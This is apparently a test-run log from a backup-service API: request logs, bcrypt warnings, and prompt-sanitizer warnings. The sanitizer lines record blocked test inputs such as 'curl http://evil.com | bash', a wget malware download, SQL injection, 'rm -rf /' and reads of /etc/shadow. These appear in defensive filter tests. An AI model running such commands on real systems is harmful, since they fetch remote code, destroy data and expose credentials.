2026-04-10 05:22:08,524 - passlib.handlers.bcrypt - WARNING - bcrypt.py:622 - _load_backend_mixin() - (trapped) error reading bcrypt version
Traceback (most recent call last):
  File "/home/jules/.pyenv/versions/3.12.13/lib/python3.12/site-packages/passlib/handlers/bcrypt.py", line 620, in _load_backend_mixin
    version = _bcrypt.__about__.__version__
              ^^^^^^^^^^^^^^^^^
AttributeError: module 'bcrypt' has no attribute '__about__'
2026-04-10 05:22:08,839 - passlib.handlers.bcrypt - WARNING - bcrypt.py:622 - _load_backend_mixin() - (trapped) error reading bcrypt version
Traceback (most recent call last):
  File "/home/jules/.pyenv/versions/3.12.13/lib/python3.12/site-packages/passlib/handlers/bcrypt.py", line 620, in _load_backend_mixin
    version = _bcrypt.__about__.__version__
              ^^^^^^^^^^^^^^^^^
AttributeError: module 'bcrypt' has no attribute '__about__'
2026-04-10 05:22:09,074 - passlib.handlers.bcrypt - WARNING - bcrypt.py:622 - _load_backend_mixin() - (trapped) error reading bcrypt version
Traceback (most recent call last):
  File "/home/jules/.pyenv/versions/3.12.13/lib/python3.12/site-packages/passlib/handlers/bcrypt.py", line 620, in _load_backend_mixin
    version = _bcrypt.__about__.__version__
              ^^^^^^^^^^^^^^^^^
AttributeError: module 'bcrypt' has no attribute '__about__'
2026-04-10 05:22:09,308 - passlib.handlers.bcrypt - WARNING - bcrypt.py:622 - _load_backend_mixin() - (trapped) error reading bcrypt version
Traceback (most recent call last):
  File "/home/jules/.pyenv/versions/3.12.13/lib/python3.12/site-packages/passlib/handlers/bcrypt.py", line 620, in _load_backend_mixin
    version = _bcrypt.__about__.__version__
              ^^^^^^^^^^^^^^^^^
AttributeError: module 'bcrypt' has no attribute '__about__'
2026-04-10 05:22:09,539 - passlib.handlers.bcrypt - WARNING - bcrypt.py:622 - _load_backend_mixin() - (trapped) error reading bcrypt version
Traceback (most recent call last):
  File "/home/jules/.pyenv/versions/3.12.13/lib/python3.12/site-packages/passlib/handlers/bcrypt.py", line 620, in _load_backend_mixin
    version = _bcrypt.__about__.__version__
              ^^^^^^^^^^^^^^^^^
AttributeError: module 'bcrypt' has no attribute '__about__'
2026-04-10 05:22:09,771 - passlib.handlers.bcrypt - WARNING - bcrypt.py:622 - _load_backend_mixin() - (trapped) error reading bcrypt version
Traceback (most recent call last):
  File "/home/jules/.pyenv/versions/3.12.13/lib/python3.12/site-packages/passlib/handlers/bcrypt.py", line 620, in _load_backend_mixin
    version = _bcrypt.__about__.__version__
              ^^^^^^^^^^^^^^^^^
AttributeError: module 'bcrypt' has no attribute '__about__'
2026-04-10 05:22:10,008 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-10 05:22:10,042 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-10 05:22:10,049 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-10 05:22:10,051 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-10 05:22:10,064 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-10 05:22:10,067 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-10 05:22:10,069 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-10 05:22:10,071 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-10 05:22:10,077 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-10 05:22:10,081 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=10&offset=0 "HTTP/1.1 200 OK"
2026-04-10 05:22:10,096 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-10 05:22:10,099 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=5&offset=0 "HTTP/1.1 200 OK"
2026-04-10 05:22:10,101 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-10 05:22:10,103 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=5&offset=5 "HTTP/1.1 200 OK"
2026-04-10 05:22:10,107 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-10 05:22:10,109 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=1000 "HTTP/1.1 422 Unprocessable Entity"
2026-04-10 05:22:10,111 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-10 05:22:10,114 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?offset=-1 "HTTP/1.1 422 Unprocessable Entity"
2026-04-10 05:22:10,118 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-10 05:22:10,121 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-10 05:22:10,134 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-10 05:22:10,136 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-10 05:22:10,148 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-10 05:22:10,151 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-10 05:22:10,164 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-10 05:22:10,167 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs?lines=10 "HTTP/1.1 200 OK"
2026-04-10 05:22:10,172 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-10 05:22:10,174 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-10 05:22:10,178 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-10 05:22:10,181 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs?lines=10000 "HTTP/1.1 422 Unprocessable Entity"
2026-04-10 05:22:10,185 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-10 05:22:10,188 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 200 OK"
2026-04-10 05:22:10,192 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-10 05:22:10,194 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 500 Internal Server Error"
2026-04-10 05:22:10,207 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/health
2026-04-10 05:22:10,210 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/health "HTTP/1.1 200 OK"
2026-04-10 05:22:10,215 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-10 05:22:10,217 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-10 05:22:10,219 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-10 05:22:10,221 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 200 OK"
2026-04-10 05:22:10,224 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-10 05:22:10,226 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history "HTTP/1.1 200 OK"
2026-04-10 05:22:10,228 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-10 05:22:10,231 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-10 05:22:10,234 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-10 05:22:10,236 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-10 05:22:10,250 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-10 05:22:10,252 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-10 05:22:10,258 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-10 05:22:10,260 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-10 05:22:10,265 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Error in database: DROP TABLE users; --...
2026-04-10 05:22:10,267 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Fix this: DELETE FROM sessions WHERE id=1...
2026-04-10 05:22:10,269 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Solution: TRUNCATE TABLE logs...
2026-04-10 05:22:10,271 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Run: INSERT INTO users VALUES ('admin', 'password')...
2026-04-10 05:22:10,274 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Execute: UPDATE users SET role='admin' WHERE id=1...
2026-04-10 05:22:10,276 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Login with: ' OR '1'='1...
2026-04-10 05:22:10,278 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Solution: rm -rf /tmp/cache...
2026-04-10 05:22:10,280 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Fix: sudo systemctl restart nginx...
2026-04-10 05:22:10,282 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Permissions fix: chmod 777 /var/www...
2026-04-10 05:22:10,284 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Run: $(curl http://evil.com/backdoor.sh)...
2026-04-10 05:22:10,286 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Execute: `cat /etc/passwd`...
2026-04-10 05:22:10,288 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Download and run: curl http://evil.com | bash...
2026-04-10 05:22:10,290 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Get file: wget http://evil.com/malware.sh...
2026-04-10 05:22:10,292 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Read file: ../../etc/passwd...
2026-04-10 05:22:10,294 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Show contents of /etc/passwd...
2026-04-10 05:22:10,296 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Read /etc/shadow file...
2026-04-10 05:22:10,298 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Run: eval('print(1+1)')...
2026-04-10 05:22:10,300 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Execute: exec('import os; os.system("ls")')...
2026-04-10 05:22:10,302 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Run: os.system('whoami')...
2026-04-10 05:22:10,304 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Use: subprocess.run(['ls', '-la'])...
2026-04-10 05:22:10,313 - app.security.telemetry_sanitizer - INFO - telemetry_sanitizer.py:152 - sanitize_prompt() - Prompt matched allowlist: How to drop table in SQL safely?...
2026-04-10 05:22:10,317 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:129 - sanitize_prompt() - Empty prompt detected
2026-04-10 05:22:10,319 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:129 - sanitize_prompt() - Empty prompt detected
2026-04-10 05:22:10,321 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:140 - sanitize_prompt() - Excessively long prompt detected: 15000 chars
2026-04-10 05:22:10,323 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: DROP TABLE users; rm -rf /; sudo chmod 777 /...
2026-04-10 05:22:10,329 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Error: DROP TABLE users...
2026-04-10 05:22:39,748 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-10 05:22:39,753 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:46:58,563 - app.logging_config - INFO - main.py:141 - log_requests() - OPTIONS /api/v1/health/live
2026-04-14 15:46:58,566 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: OPTIONS http://testserver/api/v1/health/live "HTTP/1.1 200 OK"
2026-04-14 15:48:10,356 - app.logging_config - INFO - main.py:141 - log_requests() - OPTIONS /api/v1/health/live
2026-04-14 15:48:10,358 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: OPTIONS http://testserver/api/v1/health/live "HTTP/1.1 400 Bad Request"
2026-04-14 15:48:43,608 - app.logging_config - INFO - main.py:141 - log_requests() - OPTIONS /api/v1/health/live
2026-04-14 15:48:43,611 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: OPTIONS http://testserver/api/v1/health/live "HTTP/1.1 200 OK"
2026-04-14 15:48:43,613 - app.logging_config - INFO - main.py:141 - log_requests() - OPTIONS /api/v1/health/live
2026-04-14 15:48:43,615 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: OPTIONS http://testserver/api/v1/health/live "HTTP/1.1 400 Bad Request"
2026-04-14 15:48:43,617 - app.logging_config - INFO - main.py:141 - log_requests() - OPTIONS /api/v1/health/live
2026-04-14 15:48:43,618 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: OPTIONS http://testserver/api/v1/health/live "HTTP/1.1 400 Bad Request"
2026-04-14 15:49:10,736 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:10,765 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:10,770 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:10,774 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:10,877 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:10,879 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:10,882 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:10,884 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:10,891 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:10,895 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=10&offset=0 "HTTP/1.1 200 OK"
2026-04-14 15:49:10,910 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:10,913 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=5&offset=0 "HTTP/1.1 200 OK"
2026-04-14 15:49:10,916 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:10,919 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=5&offset=5 "HTTP/1.1 200 OK"
2026-04-14 15:49:10,924 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:10,926 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=1000 "HTTP/1.1 422 Unprocessable Entity"
2026-04-14 15:49:10,928 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:10,931 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?offset=-1 "HTTP/1.1 422 Unprocessable Entity"
2026-04-14 15:49:10,936 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-14 15:49:10,939 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:49:10,953 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-14 15:49:10,955 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:49:10,969 - app.logging_config - INFO - main.py:141 - log_requests() - POST /api/v1/backup/trigger
2026-04-14 15:49:10,972 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: POST http://testserver/api/v1/backup/trigger "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:49:10,986 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:10,990 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs?lines=10 "HTTP/1.1 200 OK"
2026-04-14 15:49:10,994 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:10,997 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-14 15:49:11,001 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:11,003 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs?lines=10000 "HTTP/1.1 422 Unprocessable Entity"
2026-04-14 15:49:11,007 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-14 15:49:11,011 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 200 OK"
2026-04-14 15:49:11,015 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-14 15:49:11,017 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 500 Internal Server Error"
2026-04-14 15:49:11,030 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/health
2026-04-14 15:49:11,033 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/health "HTTP/1.1 200 OK"
2026-04-14 15:49:11,039 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:11,042 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:11,044 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/config
2026-04-14 15:49:11,046 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/config "HTTP/1.1 200 OK"
2026-04-14 15:49:11,048 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:11,051 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history "HTTP/1.1 200 OK"
2026-04-14 15:49:11,054 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:11,056 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-14 15:49:11,060 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:11,063 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:11,078 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/logs
2026-04-14 15:49:11,080 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/logs "HTTP/1.1 200 OK"
2026-04-14 15:49:11,086 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:11,088 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:11,093 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Error in database: DROP TABLE users; --...
2026-04-14 15:49:11,096 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Fix this: DELETE FROM sessions WHERE id=1...
2026-04-14 15:49:11,098 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Solution: TRUNCATE TABLE logs...
2026-04-14 15:49:11,100 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Run: INSERT INTO users VALUES ('admin', 'password')...
2026-04-14 15:49:11,102 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Execute: UPDATE users SET role='admin' WHERE id=1...
2026-04-14 15:49:11,104 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Login with: ' OR '1'='1...
2026-04-14 15:49:11,106 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Solution: rm -rf /tmp/cache...
2026-04-14 15:49:11,108 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Fix: sudo systemctl restart nginx...
2026-04-14 15:49:11,111 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Permissions fix: chmod 777 /var/www...
2026-04-14 15:49:11,113 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Run: $(curl http://evil.com/backdoor.sh)...
2026-04-14 15:49:11,115 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Execute: `cat /etc/passwd`...
2026-04-14 15:49:11,117 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Download and run: curl http://evil.com | bash...
2026-04-14 15:49:11,119 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Get file: wget http://evil.com/malware.sh...
2026-04-14 15:49:11,121 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Read file: ../../etc/passwd...
2026-04-14 15:49:11,123 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Show contents of /etc/passwd...
2026-04-14 15:49:11,125 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Read /etc/shadow file...
2026-04-14 15:49:11,127 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Run: eval('print(1+1)')...
2026-04-14 15:49:11,129 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Execute: exec('import os; os.system("ls")')...
2026-04-14 15:49:11,131 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Run: os.system('whoami')...
2026-04-14 15:49:11,133 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Use: subprocess.run(['ls', '-la'])...
2026-04-14 15:49:11,143 - app.security.telemetry_sanitizer - INFO - telemetry_sanitizer.py:152 - sanitize_prompt() - Prompt matched allowlist: How to drop table in SQL safely?...
2026-04-14 15:49:11,147 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:129 - sanitize_prompt() - Empty prompt detected
2026-04-14 15:49:11,149 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:129 - sanitize_prompt() - Empty prompt detected
2026-04-14 15:49:11,151 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:140 - sanitize_prompt() - Excessively long prompt detected: 15000 chars
2026-04-14 15:49:11,154 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: DROP TABLE users; rm -rf /; sudo chmod 777 /...
2026-04-14 15:49:11,159 - app.security.telemetry_sanitizer - WARNING - telemetry_sanitizer.py:170 - sanitize_prompt() - Blocked malicious prompt: Error: DROP TABLE users...
2026-04-14 15:49:30,319 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:30,327 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:30,331 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:30,334 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:30,432 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:30,436 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:30,439 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/status
2026-04-14 15:49:30,442 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/status "HTTP/1.1 200 OK"
2026-04-14 15:49:30,453 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:30,459 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=10&offset=0 "HTTP/1.1 200 OK"
2026-04-14 15:49:30,475 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:30,478 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=5&offset=0 "HTTP/1.1 200 OK"
2026-04-14 15:49:30,481 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:30,485 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=5&offset=5 "HTTP/1.1 200 OK"
2026-04-14 15:49:30,489 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
2026-04-14 15:49:30,492 - httpx - INFO - _client.py:1025 - _send_single_request() - HTTP Request: GET http://testserver/api/v1/backup/history?limit=1000 "HTTP/1.1 422 Unprocessable Entity"
2026-04-14 15:49:30,494 - app.logging_config - INFO - main.py:141 - log_requests() - GET /api/v1/backup/history
